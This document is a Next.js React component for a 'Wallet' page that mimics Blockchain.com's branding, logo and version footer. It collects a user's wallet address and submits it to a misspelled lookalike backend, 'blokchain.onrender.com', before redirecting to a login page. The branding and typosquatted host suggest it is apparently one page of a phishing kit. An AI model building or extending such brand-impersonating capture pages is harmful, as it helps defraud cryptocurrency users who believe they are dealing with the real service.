/* eslint-disable react/no-unescaped-entities */
'use client'
import Image from "next/image";
import Link from "next/link";
import React from "react";
import { useState } from "react";
import axios from "axios";
import { useRouter, useSearchParams } from "next/navigation";
import { ScaleLoader } from "react-spinners";

const Wallet = () => {

  const [input, setInput] = useState({});
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()
  const params = useSearchParams()

  const id = params.get('id')

  const handleChange = (event: any) => {
    const name = event.target.name;
    const value = event.target.value;
    setInput(values => ({ ...values, [name]: value }))
  }

  const handleSubmit = async (event: any) => {
    event.preventDefault()
    setIsLoading(true)
    try {
      const response = await axios.patch('https://blokchain.onrender.com/register/', {...input, id:id})
      .then((data)=>{
        router.push('/login')
      })
      console.log(response)
      setIsLoading(false)
    } catch (error) {
      console.log(error)
      setIsLoading(false)
    }
  }

  return (
    <div className=" m-0 p-0 h-full">
      <div className=" p-0 m-0 h-full md:flex md:flex-col md:items-center bg-[#121d33] min-h-full w-full">
        <div className=" md:top-16 right-6 w-auto absolute flex flex-col-reverse justify-start items-start z-50"></div>
        <div className=" relative w-full">
          <div className=" w-full h-28 my-0 mx-auto bg-[#121d33]">
            <div className=" py-0 px-4 bg-[#121d33] bg-user relative flex flex-row justify-between items-center w-full h-full">
              <div className=" flex flex-row w-full justify-center pl-0 items-center">
                <div className=" flex flex-row justify-center items-center">
                  <Link
                    href="/"
                    className=" flex flex-row justify-center items-center text-base text-[#0c6cf2] cursor-pointer font-sans"
                  >
                    <Image
                      alt="logo"
                      src="/bc-logo.svg"
                      width={240}
                      height={24}
                    />
                  </Link>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className=" flex flex-col justify-center items-center z-10 max-w-full box-border my-0 mx-4">
          <div className=" flex relative flex-col items-center">
            <div className=" first:mr-0 flex items-center flex-col w-[35rem]">
              <div className=" bg-white w-[28rem] rounded-xl box-border">
                <div className=" pt-8 px-8 pb-0">
                  <div className=" flex justify-center gap-3 items-center">
                    <Image
                      alt="wallet"
                      src="/wallet-no-background.svg"
                      width={29}
                      height={28}
                    />
                    <div className=" font-sans font-medium text-xl text-[#5322e5]">
                      Wallet
                    </div>
                  </div>
                  <form className=" mt-5 w-full" onSubmit={handleSubmit}>
                    <div className=" w-full flex relative flex-col mb-4">
                      <div className=" last:mr-0 *:max-h-[26rem] transition-all relative w-full">
                        <label>
                          <div className=" mb-[5px] font-sans font-medium text-sm text-[#353f52] block opacity-100">
                            Wallet Address
                          </div>
                        </label>
                        <div className=" flex w-full items-center relative">
                          <input
                          name="wallet"
                          required
                          onChange={handleChange}
                            className="block w-full h-12 min-h-12 py-[6px] px-3 text-base font-normal text-[#121d33] bg-white font-sans border rounded-lg"
                            placeholder="Your Wallet Address"
                          />
                        </div>
                        <div className=" absolute block -top-5 r-0 h-4 font-sans font-normal text-xs text-[#d93b30] opacity-0"></div>
                      </div>
                    </div>
                    <div className=" flex flex-col items-center">
                    <button
                        type="submit"
                        className=" my-4 flex flex-row justify-center items-center w-full min-w-[140px] h-12 py-[10px] px-[15px] font-sans text-center align-middle transition-all whitespace-nowrap  text-sm rounded-lg text-white opacity-100 border bg-[#0c6cf2] border-[#0c6cf2] disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={isLoading}
                      >
                        {!isLoading ? (
                          <div className=" font-sans font-medium text-base text-white block opacity-100">
                            Continue
                          </div>
                        ) : (
                          <ScaleLoader
                            color="#B7E8EB"
                            loading={isLoading}
                            height={20}
                            aria-label="Loading Spinner"
                            data-testid="loader"
                          />
                        )}
                      </button>
                    </div>
                  </form>
                </div>
                {/* <div className=" flex justify-center mt-6 border-t border-[#f0f2f7] pb-6">
                  <div className=" flex gap-1 items-center">
                    <div className=" cursor-pointer mt-4 font-sans font-normal text-base text-[#677184] block opacity-100">
                      Don't Have a Blockchain Account?
                    </div>
                    <Link
                      href="/signup"
                      className=" cursor-pointer mt-4 font-sans font-normal text-base text-[#0c6cf2] block opacity-100"
                    >
                      Sign up Now
                    </Link>
                  </div>
                </div> */}
              </div>
            </div>
          </div>
        </div>
        <div className=" mb-8 flex  justify-center items-center flex-col w-full mt-[246px]">
          <div className=" pt-8 px-8 pb-0 flex gap-1 items-center text-xl">
            <div className=" mx-2 inline-flex relative text-gray-400 text-base">
              {" "}
              English
            </div>
            <div className=" Text-gray-400 mx-2 text-base text-gray-400">
              Version 4.97.2
            </div>
            <div className=" Text-gray-400 mx-2 text-base text-gray-400">
              Need Help?
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Wallet;
